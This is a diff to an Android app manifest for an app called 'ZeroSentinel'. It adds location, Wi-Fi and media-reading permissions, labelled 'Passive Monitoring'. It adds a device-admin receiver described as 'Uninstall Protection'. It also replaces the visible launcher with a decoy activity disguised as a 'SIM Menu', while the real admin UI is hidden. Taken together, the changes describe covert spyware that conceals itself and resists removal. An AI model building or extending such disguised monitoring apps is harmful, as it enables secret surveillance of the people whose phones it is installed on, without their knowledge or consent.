@@ -8,6 +8,14 @@
 
     <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES" />
 
+    <!-- Passive Monitoring Permissions -->
+    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
+    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" /> <!-- For SSID on Android 8+ -->
+    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" /> <!-- Android < 13 -->
+    <uses-permission android:name="android.permission.READ_MEDIA_IMAGES" /> <!-- Android 13+ -->
+    <uses-permission android:name="android.permission.READ_MEDIA_VIDEO" /> <!-- Android 13+ -->
+
     <application
         android:name=".ZeroSentinelApp"
         android:allowBackup="true"
@@ -51,31 +59,40 @@
             </intent-filter>
         </receiver>
 
-        <!-- Main Activity (Wizard) -->
+        <!-- Device Admin Receiver (Uninstall Protection) -->
+        <receiver
+            android:name=".receivers.SentinelDeviceAdminReceiver"
+            android:description="@string/app_name"
+            android:label="@string/app_name"
+            android:permission="android.permission.BIND_DEVICE_ADMIN"
+            android:exported="true">
+            <meta-data
+                android:name="android.app.device_admin"
+                android:resource="@xml/device_admin_policies" />
+            <intent-filter>
+                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
+            </intent-filter>
+        </receiver>
+
+        <!-- Main Activity (Hidden Admin UI) -->
         <activity
             android:name=".ui.MainActivity"
             android:exported="true"
             android:theme="@style/Theme.ZeroSentinel"
-            android:enabled="true"> <!-- Default Enabled -->
+            android:enabled="true" />
+
+        <!-- SIM Menu Decoy (Public Launcher) -->
+        <activity
+            android:name=".ui.SIMMenuActivity"
+            android:exported="true"
+            android:icon="@drawable/ic_sim_menu"
+            android:label="SIM Menu"
+            android:theme="@style/Theme.AppCompat.Light.NoActionBar">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
                 <category android:name="android.intent.category.LAUNCHER" />
             </intent-filter>
         </activity>
-
-        <!-- Stealth Alias (Hidden/Disguised) -->
-        <activity-alias
-            android:name=".ui.StealthAlias"
-            android:targetActivity=".ui.MainActivity"
-            android:label="SIM Menu"
-            android:icon="@drawable/ic_sim_menu"
-            android:enabled="false"
-            android:exported="true">
-            <intent-filter>
-                <action android:name="android.intent.action.MAIN" />
-                <category android:name="android.intent.category.LAUNCHER" />
-            </intent-filter>
-        </activity-alias>
 
     </application>
 
